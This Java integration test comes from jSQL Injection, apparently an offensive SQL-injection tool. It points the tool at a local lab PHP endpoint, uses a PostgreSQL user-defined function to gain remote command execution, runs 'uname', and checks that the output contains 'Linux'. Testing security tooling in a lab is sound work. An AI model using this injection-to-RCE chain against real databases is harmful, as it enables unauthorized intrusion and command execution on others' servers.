package com.test.vendor.postgres;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.ExploitMode;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.UUID;

public class PostgresExploitRceSuiteIT extends ConcretePostgresSuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initQueryString(
            "http://jsql-lamp:8079/php/get-pg.php?id="
        );

        model
        .getMediatorUtils()
        .getPreferencesUtil()
        .withIsStrategyBlindDisabled(true)
        .withIsStrategyTimeDisabled(true);
        
        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");

        model.beginInjection();
    }

    @RetryingTest(3)
    public void exploitUdfAuto() throws JSqlException {
        this.injectionModel.getUdfAccess().createExploitRcePostgres(ExploitMode.AUTO);
        String resultCommand = this.injectionModel.getUdfAccess().runCommandRcePostgres("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }
}
